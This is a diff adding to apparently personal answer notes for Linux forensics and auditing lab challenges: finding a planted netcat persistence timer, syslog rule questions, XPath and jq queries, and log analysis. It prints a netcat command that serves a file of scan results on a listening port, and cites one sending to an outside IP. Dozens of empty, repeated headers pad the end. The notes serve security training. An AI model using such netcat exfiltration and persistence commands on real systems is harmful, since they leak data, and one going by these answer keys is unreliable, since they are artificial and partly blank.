@@ -417,6 +417,52 @@ Binary file /home/garviel/Win_Bootkit.vdi matches
 /home/garviel/sorted_output.txt:HEAD
 
 From the fourth file we can tell that the file path is /home/garviel/.bash_logout and this is a nc (netcat) command being sent to ip address 12.54.37.8 port 12000
+Answer -> netcat -lp 3389 < /tmp/NMAP_all_hosts.txt,whatischaos.timer
+
+systemctl list-timers # See all the timers that are currently running. Systemd timers can also be used for scheduling tasks. See what tasks are scheduled
+# From running this, whatischaos.timer appears to fit the 15 minutes window and the 60-seconds interval 
+
+systemctl status whatischaos.timer # Let's check the location of whatischaos timer. It's located at /lib/systemd/system/whatischaos.timer
+
+cat /lib/systemd/system/whatischaos.timer # Lets find out what commands could be present in the whatischaos.timer file. ExecStart=. This line will specify the command that the timer is executing periodically.This file is missing ExecStart line. We therefore hunt for the service file 
+
+# The service file is located in the same location as the .timer file but ends with .service instead so, /lib/systemd/system/whatischaos.service
+
+cat /lib/systemd/system/whatischaos.service # This shows the contents of the .service file as below 
+
+[Unit]
+Description=Run a service
+
+[Service]
+Type=exec
+ExecStart=/bin/bash -c 'netcat -lp 3389 < /tmp/NMAP_all_hosts.txt'
+Restart=no
+RuntimeMaxSec=60s
+
+
+From this file, we can tell that the command would be /bin/bash -c 'netcat -lp 3389 < /tmp/NMAP_all_hosts.txt' therefore the answer will be 
+
+netcat -lp 3389 < /tmp/NMAP_all_hosts.txt,whatischaos.timer
+
+netcat -lp 3389 < /tmp/NMAP_all_hosts.txt -> command
+whatischaos.timer -> persistence
+
+
+######################################################### Linux Process Find Evil 4 15 #########################################################
+
+Scenario: The web server has been modified by an unknown hacktivist group. Users accessing the web server are reporting crashes and insane disk usage.
+
+Task: Identify the Cyber Attack Method used by the group, and the command running.
+
+Flag format: method,command
+
+Machine: Terra
+
+Try not to break your machine on this one...
+
+*********************************************************     SOLUTION        **********************************************************
+
+
 
 ######################################################### Linux Processes 1 5 #########################################################
 
@@ -470,5 +516,722 @@ BEGIN { RS="</host>"; FS="\n"; OFS="" }
   }
 }
 ' /home/garviel/output.xml | md5sum
+
+
+
+######################################################################################################################################################
+######################################################                                             ###################################################
+######################################################        14_linux_auditing_and_logging        ###################################################
+######################################################                                             ###################################################
+######################################################################################################################################################
+
+
+######################################################### Linux Auditing and Logging XML 1 5 #########################################################
+
+File: /home/garviel/output.xml
+
+Identify the XML element name in the output below
+
+<scaninfo type="syn" protocol="tcp" numservices="200" services="1-200"/>
+
+Flag: The element, with start and end tags
+
+
+*********************************************************     SOLUTION        **********************************************************
+
+<scaninfo>
+
+######################################################### Linux Auditing and Logging XML 2 5 #########################################################
+
+Identify one of the XML attributes in the output below
+
+<scaninfo type="syn" protocol="tcp" numservices="200" services="1-200"/>
+
+Flag format: value="pair"
+
+*********************************************************     SOLUTION        **********************************************************
+
+numservices="200"
+
+######################################################### Linux Auditing and Logging Standards 1 5 #########################################################
+
+What RFC is Syslog?
+
+*********************************************************     SOLUTION        **********************************************************
+
+RFC 5424 
+
+######################################################### Linux Auditing and Logging Standards 2 5 #########################################################
+
+Challenge only allows 3 attempts
+
+What is the numerical code assigned to the facility dealing with authorization?
+
+*********************************************************     SOLUTION        **********************************************************
+
+4
+
+######################################################### Linux Auditing and Logging Standards 3 5 #########################################################
+
+Challenge only allows 3 attempts
+
+How many severity codes are defined in the standard that defines syslog?
+
+*********************************************************     SOLUTION        **********************************************************
+
+8
+
+######################################################### Linux Auditing and Logging Standards 4 5 #########################################################
+
+Challenge only allows 3 attempts
+
+What severity is assigned to system instability messages?
+
+Hint: Use the numerical code!
+
+*********************************************************     SOLUTION        **********************************************************
+
+0
+
+######################################################### Linux Auditing and Logging Syslog 1 5 #########################################################
+
+Challenge only allows 3 attempts
+
+Download the attached rsyslog configuration file for the Syslog # challenges.
+
+In the legacy rules section of the file, what facility is logged to 0.log?
+
+*********************************************************     SOLUTION        **********************************************************
+
+0
+
+######################################################### Linux Auditing and Logging Syslog 2 5 #########################################################
+
+Challenge only allows 3 attempts
+
+In the legacy rules section of the file, how many severities are logged to 0.log?
+
+Flag: Total number of severities
+
+*********************************************************     SOLUTION        **********************************************************
+
+8 severities as it includes all 
+
+######################################################### Linux Auditing and Logging Syslog 3 5 #########################################################
+
+In the legacy rules section of the file, how many severities are logged to 4min.log?
+
+List the severities from highest severity (lowest numerical listed) to lowest severity (highest numerical listed) using their severity name.
+
+Flag format: name,name,name
+
+*********************************************************     SOLUTION        **********************************************************
+
+emergency,alert,critical,error,warning
+
+######################################################### Linux Auditing and Logging Syslog 4 5 #########################################################
+
+In the legacy rules section of the file, how many severities are logged to 4sig.log?
+
+List the severities from highest severity (lowest numerical listed) to lowest severity (highest numerical listed), using their severity name.
+
+Flag format: name,name,name
+
+Hint: I’m sure they made a man page for this. Read the downloaded file for some links.
+
+*********************************************************     SOLUTION        **********************************************************
+
+! implies that its greater than and not inclusive of the number provided.
+
+Notice,Informational,Debug
+
+######################################################### Linux Auditing and Logging Syslog 5 5 #########################################################
+
+Challenge only allows 3 attempts
+
+What is being logged in not.log?
+
+Provide the facilities from lowest facility to highest facility numerically, and the severity being logged. (List only the first word for each.)
+
+Flag format: facility,facility,facility,severity
+
+*********************************************************     SOLUTION        **********************************************************
+
+https://success.trendmicro.com/dcx/s/solution/TP000086250?language=en_US
+
+mail,clock,NTP,notice
+
+######################################################### Linux Auditing and Logging Syslog 6 5 #########################################################
+
+Challenge only allows 3 attempts
+
+What facilities and what severities are being sent to a remote server over a reliable connection using port 514?
+
+Provide the facility names, number of severities, and the correct destination IP address.
+
+Flag format: F,F,#,IP
+
+*********************************************************     SOLUTION        **********************************************************
+
+@@ -> indicates tcp connections which is a reliable connection! 
+
+Auth,authpriv,8,10.30.0.1 
+
+######################################################### Linux Auditing and Logging Syslog 7 5 #########################################################
+
+Challenge only allows ONE attempt
+
+Use the answer from Syslog 6 for this question.
+
+Do logs that match this filter ever get saved on the local machine?
+
+*********************************************************     SOLUTION        **********************************************************
+
+auth,authpriv.*		-/var/log/auth.log
+*.*;auth,authpriv.none		-/var/log/syslog
+auth,authpriv.*                @@10.30.0.1:514
+
+authpriv is given the value 10.30.0.1:514 and assigned tcp then sent out on auth,authpriv.*		-/var/log/auth.log ---> this implies it is getting saved. 
+The answer is thus yes.
+
+
+######################################################### Linux Auditing and Logging Syslog 8 5 #########################################################
+
+
+What messages are being sent to 10.84.0.1?
+
+Provide the facility number, the number (amount) of severity codes, and Layer 4 connection type as the answer.
+
+Flag format: F,S,Layer 4 connection Type
+
+
+*********************************************************     SOLUTION        **********************************************************
+
+kern,7,udp
+
+######################################################### Linux Auditing and Logging Standards 1 5 #########################################################
+
+File: /home/garviel/output.xml
+
+Parse all of the IP addresses from the file using XPATH queries
+
+https://www.w3schools.com/xml/xpath_intro.asp
+
+HINT:
+http://xpather.com/
+http://www.whitebeam.org/library/guide/TechNotes/xpathtestbed.rhtm
+
+Sample Output (without piping to MD5SUM)
+
+
+
+ addr="XXX.xxx.xxx.xxx"
+ addr="XXX.xxx.xxx.xxx"
+ addr="XXX.xxx.xxx.xxx"
+ addr="XXX.xxx.xxx.xxx"
+ addr="XXX.xxx.xxx.xxx"
+ addr="XXX.xxx.xxx.xxx"
+
+--TRIMMED--
+
+
+Flag format: md5 hash of output
+
+
+*********************************************************     SOLUTION        **********************************************************
+
+Parse all of the IP addresses from the file using XPATH queries
+
+To parse the IP address use the following command:
+
+xpath -q -e '//element/@attribute' file.xml
+
+In our case: xpath -q -e '//address/@addr' output.xml
+
+To get the md5 hash
+
+xpath -q -e '//address/@addr' output.xml | md5sum
+
+Ans: 0e850f14fc192c5105955ec094287bd2 
+
+######################################################### Linux Auditing and Logging XML 4 10 #########################################################
+
+File: /home/garviel/output.xml
+
+Select all of the IP addresses and ports using a single XPATH Union Statement
+
+Pipe the result to md5sum for the flag
+
+HINT:
+
+https://librarycarpentry.org/lc-webscraping/02-xpath/index.html
+http://www.tizag.com/xmlTutorial/xpathbar.php
+Sample Output (without piping to MD5SUM)
+
+
+
+ addr="xx.xxx.xx.xx"
+ addr="xx.xxx.xx.xx"
+ addr="xx.xxx.xx.xx"
+ addr="xx.xxx.xx.xx"
+ portid="xx"
+ addr="10.50.29.6"
+ addr="xx.xxx.xx.xx"
+ portid="22"
+
+--TRIMMED--
+
+*********************************************************     SOLUTION        **********************************************************
+
+To combine two information we use “|”
+
+xpath -q -e '//address/@addr | //port/@portid' output.xml
+
+Now, to get the hash: xpath -q -e '//address/@addr | //port/@portid' output.xml | md5sum
+
+ff7990139b6d09aa65afb6e069db0dec http://www.tizag.com/xmlTutorial/xpathbar.php
+
+######################################################### Linux Auditing and Logging JSON 1 10 #########################################################
+
+File: /home/garviel/conn.log
+
+Use jq to pretty print the JSON file conn.log.
+
+Hash the pretty-printed file with md5sum for the flag.
+
+Sample JSON "Pretty Print" Output (without piping to MD5SUM)
+
+
+  "ts": 1615383120.585641,
+  "uid": "C9ybUDHykHdrh0h93",
+  "id.orig_h": "10.50.24.73",
+  "id.orig_p": 38156,
+  "id.resp_h": "192.168.65.20",
+  "id.resp_p": 443,
+  "proto": "tcp",
+  "duration": 2.8133392333984375e-05,
+  "orig_bytes": 0,
+  "resp_bytes": 0,
+
+HINT:
+
+https://jqplay.org/
+
+https://docs.jsonata.org/simple
+
+https://stedolan.github.io/jq/manual/
+
+
+
+*********************************************************     SOLUTION        **********************************************************
+
+To read the jason file:
+
+jq . File.json, In our case: jq . conn.log
+
+To get md5 jq . conn.log | md5sum
+
+25ebedf7442e470eaaa48b5f7d5b96f4
+
+######################################################### Linux Auditing and Logging JSON 2 10 #########################################################
+
+File : /home/garviel/conn.log
+
+This file is a conn.log made in Zeek (Bro) with data about TCP/IP connections.
+
+Use jq to locate and count the unique originating endpoint IP addresses in the file. Enter the number of unique originating IP addresses as the flag.
+
+Flag format: #
+
+HINT: Use this link to understand the JSON object’s attributes
+
+
+*********************************************************     SOLUTION        **********************************************************
+
+d.orig_h addr Originating endpoint’s IP address
+
+Here, in JSON file anything after . Is being read. So, for this example we have:
+
+jq '."id.orig_h"' conn.log = This reads just the id.orig_h from thefile
+
+Now to sort the file for unique IP address:
+
+jq '."id.orig_h"' conn.log | sort | uniq | wc -l
+
+31
+
+######################################################### Linux Auditing and Logging JSON 3 10 #########################################################
+
+File: /home/garviel/conn.log
+
+This file is a conn.log made in Zeek (Bro) with data about TCP/IP connections.
+
+Use jq to locate and count connections where the destination IP sent more than 40 bytes to the source IP.
+
+Flag format: #
+
+
+
+*********************************************************     SOLUTION        **********************************************************
+
+Destination IP = id.resp_h addr Responding endpoint’s IP address (AKA RESP)
+
+Destination ip bytes, the element we are looking for is resp_ip_bytes.
+
+To get the output of thr response bytes: jq '."resp_ip_bytes" ' conn.log
+
+- this gives us all the bytes. But we just need over 40. So we use awk command
+
+jq '."resp_ip_bytes" ' conn.log | awk '$1 > 40' --- this gives us bytes over 40
+
+Here $1 = we are only looking for column 1,
+
+To count the output:
+
+garviel@terra:~$ jq '."resp_ip_bytes" ' conn.log | awk '$1 > 40' | wc -l
+
+177 https://www.geeksforgeeks.org/awk-command-unixlinux-examples/ 
+
+######################################################### Linux Auditing and Logging Standards 1 5 #########################################################
+
+Challenge only allows ONE attempt
+
+Which cron log severity code is saved only to the local machine?
+
+Flag format: #
+
+(Continue to reference your 50-cctc.conf file from Syslog1)
+
+
+*********************************************************     SOLUTION        **********************************************************
+
+cron.!=7                       @10.66.0.1:514
+cron.=7                        -/var/log/crondbg.log
+
+Answer will be 7
+
+######################################################### Linux Auditing and Logging Syslog 10 10 #########################################################
+
+Challenge only allows 3 attempts
+
+The emergency messages (only) on the system are sent to what IP Address?
+
+(Continue to reference your 50-cctc.conf file from Syslog1)
+
+
+*********************************************************     SOLUTION        **********************************************************
+
+*.=emerg			action(type="omfwd" Target="10.24.0.1" Port="20514" Protocol="tcp" Device="eth0")
+
+10.24.0.1
+
+######################################################### Linux Auditing and Logging Whut 1 10 #########################################################
+
+Use the log file attached to this for all Whut questions.
+
+How many unique users logged into this machine?
+
+*********************************************************     SOLUTION        **********************************************************
+
+control f and count the number of 'user' in the txt file. 
+
+######################################################### Linux Auditing and Logging Whut 2 10 #########################################################
+
+What is the total amount of time users were logged into the machine?
+
+Flag format: #h,#m (Replace the # with a number)
+
+*********************************************************     SOLUTION        **********************************************************
+
+Frodo ->  Apr 6 00:00:03 (start time )
+Disconnected -> Apr 6 01:15:02
+
+1 hours	12 minutes	
+
+Balrog -> Apr 6 09:35:50
+Disconnected -> Apr 6 10:26:41
+
+51 minutes
+
+Saruman -> Apr 6 13:34:17
+
+Disconnected -> Apr 6 13:53:21
+
+19 minutes
+
+Saruman -> Apr 6 13:58:20
+
+Disconnected -> Apr 6 16:43:21
+
+2 hours 45 minues
+
+
+
+totals to 5 hours, 10 minutes,,, 5h,10m
+
+######################################################### Linux Auditing and Logging Whut 3 10 #########################################################
+
+Identify the Cyber Attack Technique that Balrog is trying on the machine.
+
+HINT: https://attack.mitre.org/
+
+*********************************************************     SOLUTION        **********************************************************
+
+
+Apr 6 10:11:40 linux-opstation-7qhp sudo: pam_unix(sudo:auth): auth could not identify password for [Balrog]
+Apr 6 10:11:41 linux-opstation-7qhp sudo: Balrog : command not allowed ; TTY=pts/0 ; PWD=/home/Balrog ; USER=root ; COMMAND=apt install john -y
+
+Credential Access
+
+######################################################### Linux Auditing and Logging Whut 4 15 #########################################################
+
+Challenge only allows ONE attempt
+
+What user successfully executed commands?
+
+*********************************************************     SOLUTION        **********************************************************
+
+Apr 6 13:35:00 linux-opstation-7qhp systemd: pam_unix(systemd-user:session): session opened for user Saruman by (uid=0)
+Apr 6 13:35:01 linux-opstation-7qhp sudo: Saruman : TTY=pts/0 ; PWD=/home/Saruman ; USER=root ; COMMAND=find /var/tmp -type f
+Apr 6 13:35:02 linux-opstation-7qhp sudo: pam_unix(sudo:session): session opened for user root by Saruman(uid=0)
+
+Saruman was the only one that could run sudo commands 
+
+######################################################### Linux Auditing and Logging XML 5 15 #########################################################
+
+
+File: /home/garviel/output.xml
+
+Select every IP address with open (in use) ports using XPATH queries and XPATH axes.
+
+Pipe the result to md5sum for the flag
+
+Sample Output (without piping to MD5SUM)
+
+
+
+ addr="10.50.29.5"
+ portid="xx"
+ addr="xx.xx.xx.xx"
+ portid="xx"
+
+--TRIMMED--
+
+*********************************************************     SOLUTION        **********************************************************
+
+
+
+######################################################### Linux Auditing and Logging Standards 1 5 #########################################################
+
+
+*********************************************************     SOLUTION        **********************************************************
+
+
+
+######################################################### Linux Auditing and Logging Standards 1 5 #########################################################
+
+
+*********************************************************     SOLUTION        **********************************************************
+
+
+
+######################################################### Linux Auditing and Logging Standards 1 5 #########################################################
+
+
+*********************************************************     SOLUTION        **********************************************************
+
+
+
+######################################################### Linux Auditing and Logging Standards 1 5 #########################################################
+
+
+*********************************************************     SOLUTION        **********************************************************
+
+
+
+*********************************************************     SOLUTION        **********************************************************
+
+
+
+######################################################### Linux Auditing and Logging Standards 1 5 #########################################################
+
+
+*********************************************************     SOLUTION        **********************************************************
+
+
+
+######################################################### Linux Auditing and Logging Standards 1 5 #########################################################
+
+
+*********************************************************     SOLUTION        **********************************************************
+
+
+
+######################################################### Linux Auditing and Logging Standards 1 5 #########################################################
+
+
+*********************************************************     SOLUTION        **********************************************************
+
+
+
+######################################################### Linux Auditing and Logging Standards 1 5 #########################################################
+
+
+*********************************************************     SOLUTION        **********************************************************
+
+
+
+######################################################### Linux Auditing and Logging Standards 1 5 #########################################################
+
+
+*********************************************************     SOLUTION        **********************************************************
+
+
+
+######################################################### Linux Auditing and Logging Standards 1 5 #########################################################
+
+
+*********************************************************     SOLUTION        **********************************************************
+
+
+
+######################################################### Linux Auditing and Logging Standards 1 5 #########################################################
+
+
+*********************************************************     SOLUTION        **********************************************************
+
+
+
+######################################################### Linux Auditing and Logging Standards 1 5 #########################################################
+
+
+*********************************************************     SOLUTION        **********************************************************
+
+
+
+######################################################### Linux Auditing and Logging Standards 1 5 #########################################################
+
+
+*********************************************************     SOLUTION        **********************************************************
+
+
+
+######################################################### Linux Auditing and Logging Standards 1 5 #########################################################
+
+
+*********************************************************     SOLUTION        **********************************************************
+
+
+
+######################################################### Linux Auditing and Logging Standards 1 5 #########################################################
+
+
+*********************************************************     SOLUTION        **********************************************************
+
+
+
+######################################################### Linux Auditing and Logging Standards 1 5 #########################################################
+
+
+*********************************************************     SOLUTION        **********************************************************
+
+
+
+######################################################### Linux Auditing and Logging Standards 1 5 #########################################################
+
+
+*********************************************************     SOLUTION        **********************************************************
+
+
+
+######################################################### Linux Auditing and Logging Standards 1 5 #########################################################
+
+
+*********************************************************     SOLUTION        **********************************************************
+
+
+
+######################################################### Linux Auditing and Logging Standards 1 5 #########################################################
+
+
+*********************************************************     SOLUTION        **********************************************************
+
+
+
+######################################################### Linux Auditing and Logging Standards 1 5 #########################################################
+
+
+*********************************************************     SOLUTION        **********************************************************
+
+
+
+######################################################### Linux Auditing and Logging Standards 1 5 #########################################################
+
+
+*********************************************************     SOLUTION        **********************************************************
+
+
+
+######################################################### Linux Auditing and Logging Standards 1 5 #########################################################
+
+
+*********************************************************     SOLUTION        **********************************************************
+
+
+
+######################################################### Linux Auditing and Logging Standards 1 5 #########################################################
+
+
+*********************************************************     SOLUTION        **********************************************************
+
+
+
+######################################################### Linux Auditing and Logging Standards 1 5 #########################################################
+
+
+*********************************************************     SOLUTION        **********************************************************
+
+
+
+######################################################### Linux Auditing and Logging Standards 1 5 #########################################################
+
+
+*********************************************************     SOLUTION        **********************************************************
+
+
+
+######################################################### Linux Auditing and Logging Standards 1 5 #########################################################
+
+
+*********************************************************     SOLUTION        **********************************************************
+
+
+
+######################################################### Linux Auditing and Logging Standards 1 5 #########################################################
+
+
+*********************************************************     SOLUTION        **********************************************************
+
+
+
+######################################################### Linux Auditing and Logging Standards 1 5 #########################################################
+
+
+*********************************************************     SOLUTION        **********************************************************
+
+
+
+######################################################### Linux Auditing and Logging Standards 1 5 #########################################################
+
+
+*********************************************************     SOLUTION        **********************************************************
+
+
+
+######################################################### Linux Auditing and Logging Standards 1 5 #########################################################
+
+
+*********************************************************     SOLUTION        **********************************************************
+
 
 
